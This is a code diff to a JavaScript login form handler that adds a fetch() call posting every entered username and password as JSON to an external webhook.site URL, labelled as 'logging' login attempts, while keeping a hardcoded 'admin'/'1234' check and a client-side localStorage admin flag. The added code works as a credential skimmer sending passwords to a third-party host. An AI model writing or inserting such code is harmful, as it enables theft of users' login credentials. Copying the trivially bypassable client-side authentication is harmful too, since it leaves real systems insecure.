@@ -5,11 +5,30 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
   const password = document.getElementById("password").value;
   const error = document.getElementById("error");
 
-  // 🔑 CHANGE YOUR USERNAME & PASSWORD HERE
-  const ADMIN_USER = "admin";
-  const ADMIN_PASS = "1234";
+  // Replace with your Webhook URL
+  const webhookUrl = "https://webhook.site/8462aa53-89f0-477e-bbbc-ea6863f86e49";
 
-  if (username === ADMIN_USER && password === ADMIN_PASS) {
+  // Send login data to Webhook
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ username, password })
+  })
+  .then(response => {
+    if (response.ok) {
+      console.log("Login attempt logged.");
+    } else {
+      console.error("Failed to log login attempt.");
+    }
+  })
+  .catch(error => {
+    console.error("Error:", error);
+  });
+
+  // Simulate successful login
+  if (username === "admin" && password === "1234") {
     localStorage.setItem("isAdmin", "true");
     window.location.href = "admin.html";
   } else {
